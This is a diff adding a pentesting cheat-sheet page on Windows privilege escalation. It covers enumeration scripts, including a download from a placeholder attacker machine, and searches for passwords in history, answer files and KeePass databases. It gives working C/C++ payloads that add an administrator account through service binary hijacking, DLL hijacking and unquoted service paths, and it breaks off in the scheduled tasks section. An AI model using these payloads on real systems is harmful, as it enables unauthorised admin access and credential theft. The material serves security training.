@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Learn about various techniques and methods for privilege escalation on Windows systems, including UAC bypass, credential dumping and more, with detailed notes and code examples.">
+  <title>offsecnotes | Windows privilege escalation</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Windows privilege escalation</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#automation-script" id="toc-automation-script">Automation script</a></li>
+<li><a href="#execute-commands-as-another-user" id="toc-execute-commands-as-another-user">Execute commands as another user</a></li>
+<li><a href="#history" id="toc-history">History</a></li>
+<li><a href="#password-in-configuration-file-unattend.xml" id="toc-password-in-configuration-file-unattend.xml">Password in configuration file (Unattend.xml)</a></li>
+<li><a href="#find-password-manager-database" id="toc-find-password-manager-database">Find password manager database</a></li>
+<li><a href="#find-sensitive-information-in-configuration-files" id="toc-find-sensitive-information-in-configuration-files">Find sensitive information in configuration files</a></li>
+<li><a href="#service-binary-hijacking" id="toc-service-binary-hijacking">Service Binary Hijacking</a></li>
+<li><a href="#service-dll-hijacking" id="toc-service-dll-hijacking">Service DLL Hijacking</a></li>
+<li><a href="#unquoted-service-paths" id="toc-unquoted-service-paths">Unquoted Service Paths</a></li>
+<li><a href="#scheduled-tasks" id="toc-scheduled-tasks">Scheduled Tasks</a></li>
+<li><a href="#seimpersonateprivilege" id="toc-seimpersonateprivilege">SeImpersonatePrivilege</a></li>
+<li><a href="#uac-bypass" id="toc-uac-bypass">UAC Bypass</a></li>
+<li><a href="#impersonate-tokens" id="toc-impersonate-tokens">Impersonate Tokens</a></li>
+<li><a href="#authentication-attacks" id="toc-authentication-attacks">Authentication Attacks</a>
+<ul>
+<li><a href="#pass-the-hash" id="toc-pass-the-hash">Pass the Hash</a></li>
+<li><a href="#dumping-credentials-from-memory-sam" id="toc-dumping-credentials-from-memory-sam">Dumping Credentials from Memory &amp; SAM</a></li>
+<li><a href="#abuse-the-net-ntlmv2" id="toc-abuse-the-net-ntlmv2">Abuse the Net-NTLMv2</a></li>
+<li><a href="#relaying-net-ntlmv2" id="toc-relaying-net-ntlmv2">Relaying Net-NTLMv2</a></li>
+</ul></li>
+<li><a href="#other" id="toc-other">Other</a></li>
+</ul></div>
+  <hr>
+<blockquote>
+<p><strong>Note</strong>: If you have a valid user credential you can authenticate in windows target from SMB, RDP, WinRM.</p>
+</blockquote>
+<hr />
+<h2 id="automation-script">Automation script</h2>
+<p><strong><a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">WinPEAS</a></strong></p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>powershell</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Transfer winPEAS file</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="fu">iwr</span> <span class="op">-</span>uri http<span class="op">://&lt;</span>ATTACKER_MACHINE<span class="op">&gt;/</span>winPEASx64<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>Outfile winPEAS<span class="op">.</span><span class="fu">exe</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>\winPEAS<span class="op">.</span><span class="fu">exe</span></span></code></pre></div>
+<p><strong><a href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a></strong></p>
+<pre class="dos"><code>powershell -ep bypass -c &quot;. .\PrivescCheck.ps1; Invoke-PrivescCheck&quot;</code></pre>
+<p><strong><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp.ps1</a></strong> - <a href="https://powersploit.readthedocs.io/en/latest/Privesc/">Docs</a></p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>powershell <span class="op">-</span>ep bypass</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">.</span> <span class="op">.</span>\PowerUp<span class="op">.</span><span class="fu">ps1</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Now you can run commands like Get-ModifiableServiceFile</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>Get<span class="op">-</span>ModifiableServiceFile</span></code></pre></div>
+<blockquote>
+<p><strong>Warning</strong>: You should <strong>never fully trust the output of a tool</strong>, as it can sometimes be incorrect even on simple tasks like detecting the target machine’s operating system.</p>
+</blockquote>
+<hr />
+<h2 id="execute-commands-as-another-user">Execute commands as another user</h2>
+<ul>
+<li>If the user is a member of the <strong>Remote Desktop Users</strong> group –&gt; connect with RDP</li>
+<li>If the user is a member of the <strong>Remote Management Users</strong> group –&gt; connect with WinRM</li>
+<li>If <strong>you have access to a GUI</strong> with an other user, you can use <code>Runas</code> to run a program as a different user.</li>
+</ul>
+<div class="sourceCode" id="cb4"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>runas <span class="op">/</span>user<span class="op">:&lt;</span>USERNAME<span class="op">&gt;</span> cmd</span></code></pre></div>
+<p>After entering the password, a new command-line window opens, running under the specified user’s account.</p>
+<hr />
+<h2 id="history">History</h2>
+<p><strong>Get-History</strong></p>
+<p><code>Get-History</code> only shows commands executed before the current one in the same session.</p>
+<blockquote>
+<p><strong>Warning</strong>: The history is session-based, it doesn’t persist across PowerShell windows by default. Each time you open a new console, the history starts fresh.</p>
+</blockquote>
+<p><strong>Clear-History</strong></p>
+<p>If a user runs <code>Clear-History</code>, it will only clear PowerShell’s in-session history, which can be retrieved using <code>Get-History</code>.</p>
+<blockquote>
+<p><strong>Warning</strong>: <code>Clear-History</code> <strong>does not remove</strong>:</p>
+<ul>
+<li>The command history saved by PSReadLine to disk (<code>ConsoleHost_history.txt</code>).</li>
+<li>The content seen with <code>Ctrl+R</code> or arrow keys if PSReadLine is still managing that memory buffer.</li>
+</ul>
+</blockquote>
+<p><strong>Retrieve PSReadLine history</strong></p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Get history save path</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="op">(</span><span class="fu">Get-PSReadlineOption</span><span class="op">).</span><span class="fu">HistorySavePath</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Get content of the history file</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="fu">type</span> C<span class="op">:</span>\Users\<span class="op">&lt;</span>USERNAME<span class="op">&gt;</span>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history<span class="op">.</span><span class="fu">txt</span></span></code></pre></div>
+<p><strong>Retrieve transcript</strong></p>
+<p><code>Start-Transcript</code> [<a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript?view=powershell-7.5">↗</a>] starts recording everything that happens in your PowerShell session.</p>
+<p>By default, it stores the transcript in the following location using the default name:</p>
+<ul>
+<li>On Windows: <code>$HOME\Documents</code></li>
+<li>On Linux or macOS: <code>$HOME</code></li>
+</ul>
+<p>The default filename is <code>PowerShell_transcript.&lt;computername&gt;.&lt;random&gt;.&lt;timestamp&gt;.txt</code>.</p>
+<blockquote>
+<p><strong>Note</strong>: A user can change the location of the transcript file by using the command: <code>Start-Transcript -Path "C:\transcripts\transcript0.txt"</code>. So, be sure to look for files that have names containing the word <strong>transcript</strong>.</p>
+</blockquote>
+<hr />
+<h2 id="password-in-configuration-file-unattend.xml">Password in configuration file (Unattend.xml)</h2>
+<p>An answer file is an XML-based file that contains setting definitions and values to use during Windows Setup. Answer files (or Unattend files) are used by Administrators when they are setting up fresh images as it allows for an automated setup for Windows systems.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\unattend.xml</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Windows\Panther\Unattend.xml</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Windows\Panther\Unattend\Unattend.xml</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Windows\system32\sysprep.xml</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Windows\system32\sysprep\sysprep.xml</span></span></code></pre></div>
+<p>Extract password and decode it (from base64)</p>
+<hr />
+<h2 id="find-password-manager-database">Find password manager database</h2>
+<p>E.g. search <code>*.kdbx</code></p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-ChildItem</span> <span class="op">-</span>Path C<span class="op">:</span>\ <span class="op">-</span>Include <span class="op">*.</span><span class="fu">kdbx</span> <span class="op">-</span>File <span class="op">-</span>Recurse <span class="op">-</span>ErrorAction SilentlyContinue</span></code></pre></div>
+<hr />
+<h2 id="find-sensitive-information-in-configuration-files">Find sensitive information in configuration files</h2>
+<p>E.g. configuration files of XAMPP</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-ChildItem</span> <span class="op">-</span>Path C<span class="op">:</span>\xampp <span class="op">-</span>Include <span class="op">*.</span><span class="fu">txt</span><span class="op">,*.</span><span class="fu">ini</span> <span class="op">-</span>File <span class="op">-</span>Recurse <span class="op">-</span>ErrorAction SilentlyContinue</span></code></pre></div>
+<p>E.g. search docs in home directory of the user</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-ChildItem</span> <span class="op">-</span>Path C<span class="op">:</span>\Users\<span class="op">&lt;</span>USERNAME<span class="op">&gt;</span>\ <span class="op">-</span>Include <span class="op">*.</span><span class="fu">txt</span><span class="op">,*.</span><span class="fu">pdf</span><span class="op">,*.</span><span class="fu">xls</span><span class="op">,*.</span><span class="fu">xlsx</span><span class="op">,*.</span><span class="fu">doc</span><span class="op">,*.</span><span class="fu">docx</span> <span class="op">-</span>File <span class="op">-</span>Recurse <span class="op">-</span>ErrorAction SilentlyContinue</span></code></pre></div>
+<hr />
+<h2 id="service-binary-hijacking">Service Binary Hijacking</h2>
+<p>Get a list of all installed Windows services:</p>
+<p><strong>CMD</strong> command. (WMIC is deprecated as of Windows 10, version 21H1)</p>
+<pre class="dos"><code>wmic service get Name,DisplayName,PathName</code></pre>
+<p><strong>CMD one-liner</strong></p>
+<pre class="dos"><code>for /f &quot;tokens=2 delims=:&quot; %s in (&#39;sc query state^= all ^| findstr /R &quot;^SERVICE_NAME:&quot;&#39;) do @echo %s &amp; sc qc %s | find &quot;BINARY_PATH_NAME&quot;</code></pre>
+<p><strong>Powershell</strong></p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-CimInstance</span> <span class="op">-</span>ClassName win32_service <span class="op">|</span> <span class="fu">Select</span> Name<span class="op">,</span>State<span class="op">,</span>PathName</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: When using network logons like WinRM or bind shells, non-admin users get “permission denied” errors with <code>Get-CimInstance</code> when querying services. Interactive logons (e.g., RDP) avoid this issue.</p>
+</blockquote>
+<p>Focus on services installed by users and enumerate the permissions:</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>icacls <span class="st">&quot;C:\xampp\mysql\bin\mysqld.exe&quot;</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="co"># F   Full access</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="co"># M   Modify access</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="co"># RX  Read and execute access</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="co"># R   Read-only access</span></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="co"># W   Write-only access</span></span></code></pre></div>
+<p>If we can modify the binary, we can replace it. So, create a binary and compile it:</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main <span class="op">()</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> i<span class="op">;</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a>    i <span class="op">=</span> system <span class="op">(</span><span class="st">&quot;net user testuser somepassword /add&quot;</span><span class="op">);</span></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>    i <span class="op">=</span> system <span class="op">(</span><span class="st">&quot;net localgroup administrators testuser /add&quot;</span><span class="op">);</span></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: Create a backup of the original binary service (<code>C:\xampp\mysql\bin\mysqld.exe</code>) before proceeding.</p>
+</blockquote>
+<p>Now there are two way:</p>
+<ol type="1">
+<li><p>Restart the service:</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. with net</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>net stop mysql</span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>net <span class="fu">start</span> mysql</span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Restart-Service</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="fu">Restart-Service</span> <span class="op">-</span>Name <span class="st">&quot;mysql&quot;</span></span></code></pre></div></li>
+<li><p>If your user doesn’t have sufficient permissions to stop the service our alternative is to reboot the machine. If the service’s Startup Type is set to <code>Auto</code>, it should restart on boot</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-CimInstance</span> <span class="op">-</span>ClassName win32_service <span class="op">|</span> <span class="fu">Select</span> Name<span class="op">,</span> StartMode <span class="op">|</span> <span class="fu">Where-Object</span> <span class="op">{</span><span class="va">$_</span><span class="op">.</span><span class="fu">Name</span> <span class="op">-</span>like <span class="st">&#39;mysql&#39;</span><span class="op">}</span> </span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>Name StartMode</span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="op">----</span> <span class="op">---------</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>mysql Auto</span></code></pre></div>
+<p>To reboot, the user needs <code>SeShutDownPrivilege</code> ```powershell whoami /priv</p>
+<p>Privilege Name Description State =================== ==================== ======== SeShutdownPrivilege Shut down the system Disabled ```</p>
+<blockquote>
+<p><strong>Note</strong>: The <code>Disabled</code> state means the privilege isn’t active in the current process. Here, it shows whoami hasn’t requested <code>SeShutdownPrivilege</code> privilege.</p>
+</blockquote>
+<p>Reboot: <code>powershell  shutdown /r /t 0</code></p></li>
+</ol>
+<hr />
+<h2 id="service-dll-hijacking">Service DLL Hijacking</h2>
+<details>
+<summary>
+DLL search order
+</summary>
+<p>By default, modern Windows versions have safe DLL search mode enabled to reduce DLL hijacking risks. This mode, introduced by Microsoft, enforces a more secure DLL search order [<a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">↗</a>], as shown below:</p>
+<ol type="1">
+<li>The directory from which the application loaded.</li>
+<li>The system directory.</li>
+<li>The 16-bit system directory.</li>
+<li>The Windows directory.</li>
+<li>The current directory.</li>
+<li>The directories that are listed in the PATH environment variable.</li>
+</ol>
+</details>
+<p>The goal of this attack is to hijack the DLL search order - a technique where an attacker places a malicious DLL in a location that is searched before the legitimate one. If the application or service attempts to load a DLL that doesn’t exist in its expected location, it may end up loading the attacker’s DLL instead.</p>
+<p>To perform this attack, we first need to identify all the DLLs loaded by a specific service and detect any that are missing.</p>
+<p>We can use Process Monitor (Procmon) to capture and filter events related to the target service:</p>
+<blockquote>
+<p><strong>Note</strong>: Using Process Monitor requires administrative privileges, so you’ll need to copy the service binary to a local machine.</p>
+</blockquote>
+<ul>
+<li><p>Launch <strong>Process Monitor</strong>.</p></li>
+<li><p><strong>Add a filter</strong> to show only events related to the service’s process name.</p></li>
+<li><p><strong>Restart the service</strong> while Procmon is actively capturing:</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Restart-Service</span> <span class="op">&lt;</span>service<span class="op">&gt;</span></span></code></pre></div></li>
+<li><p><strong>Look for CreateFile events</strong> where the service attempts to access a <name>.dll file across different directories.</p></li>
+</ul>
+<p>In the Detail column of these events, if you see <code>NAME NOT FOUND</code>, it means the system attempted to locate the DLL in that path, but it wasn’t there. This indicates a potential opportunity to hijack the DLL.</p>
+<p>To exploit this:</p>
+<ul>
+<li>Identify the first directory in the search order where the service attempts to load the missing DLL.</li>
+<li>If you have write permissions to that location, <strong>place a malicious DLL with the same name</strong>.</li>
+</ul>
+<details>
+<summary>
+Example of Cpp DLL
+</summary>
+<div class="sourceCode" id="cb18"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;windows.h&gt;</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>BOOL APIENTRY DllMain<span class="op">(</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a>HANDLE hModule<span class="op">,</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a>DWORD ul_reason_for_call<span class="op">,</span></span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>LPVOID lpReserved <span class="op">)</span></span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">switch</span> <span class="op">(</span> ul_reason_for_call <span class="op">)</span></span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a>    <span class="cf">case</span> DLL_PROCESS_ATTACH<span class="op">:</span></span>
+<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> i<span class="op">;</span></span>
+<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a>    i <span class="op">=</span> system <span class="op">(</span><span class="st">&quot;net user test yourpass /add&quot;</span><span class="op">);</span></span>
+<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a>    i <span class="op">=</span> system <span class="op">(</span><span class="st">&quot;net localgroup administrators test /add&quot;</span><span class="op">);</span></span>
+<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a>    <span class="cf">case</span> DLL_THREAD_ATTACH<span class="op">:</span></span>
+<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a>    <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a>    <span class="cf">case</span> DLL_THREAD_DETACH<span class="op">:</span></span>
+<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">case</span> DLL_PROCESS_DETACH<span class="op">:</span></span>
+<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb18-21"><a href="#cb18-21" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb18-22"><a href="#cb18-22" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> TRUE<span class="op">;</span></span>
+<span id="cb18-23"><a href="#cb18-23" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Compile the code:</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="fu">gcc</span> DLL_NAME.cpp <span class="at">--shared</span> <span class="at">-o</span> <span class="op">&lt;</span>DLL_NAME<span class="op">&gt;</span>.dll</span></code></pre></div>
+</details>
+<p>When the service restarts, it may load your malicious DLL instead of the legitimate one.</p>
+<hr />
+<h2 id="unquoted-service-paths">Unquoted Service Paths</h2>
+<p>When a <strong>Windows service</strong> is installed with an <strong>unquoted path</strong> and the path contains <strong>spaces</strong>, Windows does <strong>not know where the executable truly begins and ends</strong> unless quotes (<code>"</code>) are used. It will <strong>try to execute each potential path segment</strong> until it finds a matching file. If one of these path segments is <strong>writable by a low-privilege user</strong>, you can place a <strong>malicious executable</strong> there, which will get executed with <strong>SYSTEM privileges</strong> the next time the service starts.</p>
+<details>
+<summary>
+What Windows will try to do
+</summary>
+<p>Suppose a Windows service is registered like this:</p>
+<pre class="dos"><code>C:\Program Files\My App\bin\service.exe</code></pre>
+<p>Notice that the path has spaces and is not enclosed in quotes.</p>
+<p>Here’s what Windows will try to do: Windows tries to execute the following, in this order:</p>
+<ul>
+<li><code>C:\Program.exe</code></li>
+<li><code>C:\Program Files\My.exe</code></li>
+<li><code>C:\Program Files\My App\bin\service.exe</code> (this is the real one)</li>
+</ul>
+<p>If <code>C:\Program Files\My App\bin\service.exe</code> doesn’t exist, you can place a file called <code>C:\Program.exe</code>, that will get executed instead, with SYSTEM privileges.</p>
+</details>
+<p><strong>To exploit this</strong>:</p>
+<ul>
+<li><p>There must be an <code>unquoted service path</code> with spaces in it.</p>
+<pre class="dos"><code>wmic service get name,pathname | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code></pre></li>
+<li><p>One of the earlier-resolved paths must be <code>writable</code> by a low-privileged user. To check access rights, use <code>icacls</code> in each path.</p></li>
+<li><p>You must be able to <code>create a malicious executable</code> in that path.</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main <span class="op">()</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> i<span class="op">;</span></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a>    i <span class="op">=</span> system <span class="op">(</span><span class="st">&quot;net user testuser somepassword /add&quot;</span><span class="op">);</span></span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a>    i <span class="op">=</span> system <span class="op">(</span><span class="st">&quot;net localgroup administrators testuser /add&quot;</span><span class="op">);</span></span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span></code></pre></div></li>
+<li><p>The service must <code>restart</code> (manually or through a system reboot).</p></li>
+</ul>
+<hr />
+<h2 id="scheduled-tasks">Scheduled Tasks</h2>
+<p>Scheduled Tasks (a.k.a. Task Scheduler) are Windows components that let administrators schedule programs or scripts to <strong>run automatically</strong> at specific times or under certain conditions (like at login, boot, idle, etc.).</p>
+<p>If a task runs something like:</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">Action</span>&gt;</span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">Exec</span>&gt;</span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">Command</span>&gt;C:\Scripts\Backup.bat&lt;/<span class="kw">Command</span>&gt;</span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a>  &lt;/<span class="kw">Exec</span>&gt;</span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">Action</span>&gt;</span></code></pre></div>
+<p>… and <code>C:\Scripts\Backup.bat</code> is <strong>writable by a low-priv user</strong>, you can overwrite it with a malicious payload.</p>
+<p><strong>To exploit this</strong>:</p>
+<ol type="1">
+<li><p>We can view scheduled task with the following command:</p>
